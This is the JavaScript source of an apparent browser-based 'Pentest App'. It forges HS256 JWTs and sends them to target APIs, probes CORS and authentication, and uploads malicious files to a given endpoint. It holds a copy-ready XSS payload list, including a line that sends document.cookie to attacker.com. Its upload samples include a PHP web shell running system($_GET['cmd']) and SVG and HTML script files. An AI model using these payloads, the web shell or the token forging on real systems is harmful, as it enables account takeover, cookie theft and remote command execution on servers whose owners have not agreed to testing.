// simple-test - Pentest App

// JWT signing with Web Crypto API (no external deps)
function base64url(strOrBuf) {
  const bytes = strOrBuf instanceof ArrayBuffer || ArrayBuffer.isView(strOrBuf)
    ? new Uint8Array(strOrBuf)
    : new TextEncoder().encode(strOrBuf);
  let binary = '';
  bytes.forEach(b => binary += String.fromCharCode(b));
  return btoa(binary).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

async function signJwtHs256(payload, secret) {
  const header = { alg: 'HS256', typ: 'JWT' };
  const now = Math.floor(Date.now() / 1000);
  const fullPayload = { ...payload, iat: now, exp: now + 86400 };
  const headerB64 = base64url(JSON.stringify(header));
  const payloadB64 = base64url(JSON.stringify(fullPayload));
  const toSign = `${headerB64}.${payloadB64}`;

  const encoder = new TextEncoder();
  const keyBytes = /^[0-9a-fA-F]+$/.test(secret) ? hexToBytes(secret) : encoder.encode(secret);
  const key = await crypto.subtle.importKey('raw', keyBytes, { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
  const sig = await crypto.subtle.sign('HMAC', key, encoder.encode(toSign));
  const sigB64 = base64url(sig);
  return `${toSign}.${sigB64}`;
}

function hexToBytes(hex) {
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < hex.length; i += 2) bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
  return bytes;
}

// Tab switching
document.querySelectorAll('.tab').forEach(tab => {
  tab.addEventListener('click', () => {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
    tab.classList.add('active');
    document.getElementById(`panel-${tab.dataset.panel}`).classList.add('active');
  });
});

// --- JWT Forge ---
async function forgeJwt() {
  const secret = document.getElementById('jwt-secret').value.trim();
  const payloadStr = document.getElementById('jwt-payload').value.trim();
  const output = document.getElementById('jwt-output');
  const result = document.getElementById('jwt-result');

  if (!secret || !payloadStr) {
    showResult(result, 'danger', 'Secret and payload are required');
    return;
  }

  try {
    let payload;
    try {
      payload = JSON.parse(payloadStr);
    } catch {
      showResult(result, 'danger', 'Invalid JSON in payload');
      return;
    }

    const token = await signJwtHs256(payload, secret);
    output.value = token;
    showResult(result, 'success', 'JWT forged successfully. Copy and use in Authorization header.');
  } catch (err) {
    showResult(result, 'danger', `Error: ${err.message}`);
  }
}

async function testJwtApi() {
  const token = document.getElementById('jwt-output').value.trim();
  const result = document.getElementById('jwt-result');

  if (!token) {
    showResult(result, 'warning', 'Forge a JWT first, then test.');
    return;
  }

  const url = prompt('Enter API URL to test (e.g. https://api.example.com/admin/users):');
  if (!url) return;

  try {
    const res = await fetch(url, {
      headers: { Authorization: `Bearer ${token}` }
    });
    const text = await res.text();
    let body;
    try { body = JSON.parse(text); } catch { body = text; }
    const summary = `Status: ${res.status} ${res.statusText}\n\n${typeof body === 'string' ? body : JSON.stringify(body, null, 2)}`;
    showResult(result, res.ok ? 'success' : 'warning', summary);
  } catch (err) {
    showResult(result, 'danger', `Request failed: ${err.message}`);
  }
}

// --- CORS Test ---
async function testCors() {
  const url = document.getElementById('cors-url').value.trim();
  const method = document.getElementById('cors-method').value;
  const credentials = document.getElementById('cors-credentials').checked;
  const result = document.getElementById('cors-result');

  if (!url) {
    showResult(result, 'danger', 'Enter target API URL');
    return;
  }

  try {
    const opts = {
      method,
      mode: 'cors',
      credentials: credentials ? 'include' : 'omit'
    };
    const res = await fetch(url, opts);
    const text = await res.text();
    let body;
    try { body = JSON.parse(text); } catch { body = text; }

    const corsHeader = res.headers.get('Access-Control-Allow-Origin') || '(not set)';
    const summary = `CORS Allow-Origin: ${corsHeader}\nStatus: ${res.status}\n\n${typeof body === 'string' ? body : JSON.stringify(body, null, 2)}`;
    const isVuln = corsHeader === '*' || corsHeader === 'null';
    showResult(result, isVuln ? 'danger' : 'success', summary);
  } catch (err) {
    if (err.name === 'TypeError' && err.message.includes('Failed to fetch')) {
      showResult(result, 'success', 'Request blocked - CORS is likely properly configured.');
    } else {
      showResult(result, 'danger', `Error: ${err.message}`);
    }
  }
}

// --- XSS Payloads ---
const XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '<img src=x onerror="alert(1)">',
  '<svg onload="alert(1)">',
  '<body onload="alert(1)">',
  '<input onfocus="alert(1)" autofocus>',
  '<marquee onstart="alert(1)">',
  '<details open ontoggle="alert(1)">',
  '<iframe src="javascript:alert(1)">',
  '"><script>alert(1)</script>',
  "'-alert(1)-'",
  '<img src="x" onerror="fetch(\'https://attacker.com/steal?c=\'+document.cookie)">',
  '{{constructor.constructor("alert(1)")()}}'
];

const payloadList = document.getElementById('xss-payloads');
XSS_PAYLOADS.forEach(p => {
  const el = document.createElement('div');
  el.className = 'payload-item';
  el.textContent = p;
  el.title = 'Click to copy';
  el.onclick = () => {
    navigator.clipboard.writeText(p);
    el.style.borderColor = 'var(--success)';
    setTimeout(() => el.style.borderColor = '', 500);
  };
  payloadList.appendChild(el);
});

function addCustomPayload() {
  const input = document.getElementById('xss-custom');
  const p = input.value.trim();
  if (!p) return;
  const el = document.createElement('div');
  el.className = 'payload-item';
  el.textContent = p;
  el.onclick = () => {
    navigator.clipboard.writeText(p);
    el.style.borderColor = 'var(--success)';
    setTimeout(() => el.style.borderColor = '', 500);
  };
  payloadList.appendChild(el);
  navigator.clipboard.writeText(p);
  input.value = '';
}

// --- Upload Test ---
const MALICIOUS_FILES = {
  exe: { name: 'test.exe', blob: new Blob(['MZ'], { type: 'application/x-msdownload' }) },
  svg: {
    name: 'xss.svg',
    blob: new Blob(['<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>'], { type: 'image/svg+xml' })
  },
  php: { name: 'shell.php', blob: new Blob(['<?php system($_GET["cmd"]); ?>'], { type: 'application/x-httpd-php' }) },
  html: {
    name: 'test.html',
    blob: new Blob(['<html><body><script>alert(1)</script></body></html>'], { type: 'text/html' })
  }
};

async function uploadTest(type) {
  const url = document.getElementById('upload-url').value.trim();
  const field = document.getElementById('upload-field').value.trim() || 'files.cvFile';
  const dataStr = document.getElementById('upload-data').value.trim();
  const result = document.getElementById('upload-result');

  if (!url) {
    showResult(result, 'danger', 'Enter upload endpoint URL');
    return;
  }

  const { name, blob } = MALICIOUS_FILES[type] || MALICIOUS_FILES.exe;
  const formData = new FormData();
  formData.append(field, blob, name);

  if (dataStr) {
    try {
      const data = JSON.parse(dataStr);
      formData.append('data', JSON.stringify(data));
    } catch (e) {
      formData.append('data', dataStr);
    }
  }

  try {
    const res = await fetch(url, {
      method: 'POST',
      body: formData
    });
    const text = await res.text();
    let body;
    try { body = JSON.parse(text); } catch { body = text; }
    const summary = `File: ${name}\nStatus: ${res.status}\n\n${typeof body === 'string' ? body : JSON.stringify(body, null, 2)}`;
    showResult(result, res.ok ? 'danger' : 'success', summary + (res.ok ? '\n\n⚠️ VULNERABLE: Server accepted malicious file!' : ''));
  } catch (err) {
    showResult(result, 'danger', `Error: ${err.message}`);
  }
}

async function uploadCustom() {
  const fileInput = document.getElementById('upload-file');
  const url = document.getElementById('upload-url').value.trim();
  const field = document.getElementById('upload-field').value.trim() || 'files.cvFile';
  const dataStr = document.getElementById('upload-data').value.trim();
  const result = document.getElementById('upload-result');

  if (!fileInput.files.length || !url) {
    showResult(result, 'danger', 'Select a file and enter URL');
    return;
  }

  const formData = new FormData();
  formData.append(field, fileInput.files[0]);

  if (dataStr) {
    try {
      const data = JSON.parse(dataStr);
      formData.append('data', JSON.stringify(data));
    } catch {
      formData.append('data', dataStr);
    }
  }

  try {
    const res = await fetch(url, { method: 'POST', body: formData });
    const text = await res.text();
    let body;
    try { body = JSON.parse(text); } catch { body = text; }
    showResult(result, res.ok ? 'success' : 'warning', `Status: ${res.status}\n\n${typeof body === 'string' ? body : JSON.stringify(body, null, 2)}`);
  } catch (err) {
    showResult(result, 'danger', `Error: ${err.message}`);
  }
}

// --- API Probe ---
async function probeApi(mode) {
  const url = document.getElementById('api-url').value.trim();
  const authHeader = document.getElementById('api-auth').value.trim();
  const forgedToken = document.getElementById('jwt-output').value.trim();
  const result = document.getElementById('api-result');

  if (!url) {
    showResult(result, 'danger', 'Enter API URL');
    return;
  }

  let headers = {};
  if (mode === 'token' && authHeader) headers.Authorization = authHeader;
  else if (mode === 'forged' && forgedToken) headers.Authorization = `Bearer ${forgedToken}`;
  else if (mode === 'invalid') headers.Authorization = 'Bearer invalid.token.here';

  try {
    const res = await fetch(url, { headers });
    const text = await res.text();
    let body;
    try { body = JSON.parse(text); } catch { body = text; }
    const summary = `Mode: ${mode || 'No Auth'}\nStatus: ${res.status}\n\n${typeof body === 'string' ? body : JSON.stringify(body, null, 2)}`;
    showResult(result, res.ok ? 'warning' : 'success', summary);
  } catch (err) {
    showResult(result, 'danger', `Error: ${err.message}`);
  }
}

// --- Helpers ---
function showResult(el, type, text) {
  el.style.display = 'block';
  el.className = `output ${type}`;
  el.textContent = text;
}
